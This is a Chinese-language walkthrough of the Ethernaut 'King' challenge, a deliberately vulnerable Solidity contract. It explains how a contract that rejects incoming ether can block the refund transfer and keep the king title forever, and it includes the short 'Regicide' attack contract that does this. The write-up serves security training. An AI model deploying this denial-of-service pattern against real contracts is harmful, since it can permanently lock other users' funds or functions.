# King

> 这个合约实现了一个很经典的游戏：谁的出价比当前价格高，谁就能成为新的国王.
> 你需要成为这个合约永恒的国王.让国王的权限不会再被移交

[King](https://ethernaut.openzeppelin.com/level/0x725595BA16E76ED1F6cC1e1b65A88365cC494824)

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

这个合约中，影响king变量变化的语句出现在receive函数中，我们复习一下receive函数，当合约的msg.data不存在且msg.value不为0的时候，receive被调用。

所以我们需要向King合约中转账便可以修改king权限。

这时候我们应该如何永久的成为国王呢？容易想到的是，我们阻止其他用户调用receive。从本题来看，我们需要让`payable(king).transfer(msg.value);`这段函数失败。

所以我们需要构造一个接受转账会报错的合约。显而易见的，我们通过不实现receive与fallback来完成。

以下是攻击合约的相关代码

```sol
contract Regicide {
  constructor(address addr_) payable  {
    (bool result, ) = payable(addr_).call{value: msg.value}("");
      require(result, "fail");
  }
}
```



